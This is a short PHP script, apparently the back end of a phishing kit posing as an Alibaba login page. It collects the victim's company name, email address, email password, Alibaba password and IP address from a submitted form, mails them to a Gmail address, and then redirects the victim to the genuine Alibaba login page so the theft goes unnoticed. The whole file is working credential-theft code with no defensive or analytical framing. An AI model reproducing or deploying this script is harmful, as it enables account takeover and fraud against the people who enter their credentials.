<?php
$ip = getenv("REMOTE_ADDR");
$message  = "--------------- ALiBaBa --------------\n";
$message .= "Company Name: ".$_POST['compname']."\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['password']."\n";
$message .= "Alibaba Password : ".$_POST['password1']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created B-----------------\n";
$send = "lindarose4luv@gmail.com";
$subject = "ALiBaBa";
$headers = "From: ALiBaBa<comp>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail($send, $subject, $message); 
header("Location: https://login.alibaba.com/");
	  

?>